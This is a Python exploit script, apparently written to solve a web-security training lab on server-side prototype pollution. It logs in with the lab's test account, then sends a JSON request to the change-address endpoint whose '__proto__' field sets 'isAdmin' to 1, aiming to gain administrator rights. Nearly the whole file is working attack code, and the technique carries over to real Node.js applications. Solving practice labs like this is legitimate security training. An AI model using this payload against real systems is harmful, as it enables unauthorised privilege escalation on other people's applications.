import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password,
        "csrf": get_csrf_token(s, url, path)
    }
    r = s.post(login_url, json=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def change_address(s, url, path, payload): 
    target_url = url + path
    r = s.post(target_url, json=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Success update new address')
        print(r.text)
    else:
        print('[-] Fail to change address')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    username = 'wiener'
    password = 'peter'
    target_user = 'carlos'

    login_acc(s, url, '/login', username, password)
    payload = {
        "sessionId": s.cookies.get_dict()['session'],
        "__proto__": {
            "json spaces":10,
            "isAdmin": 1
        }
    }
    change_address(s, url, '/my-account/change-address', payload)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()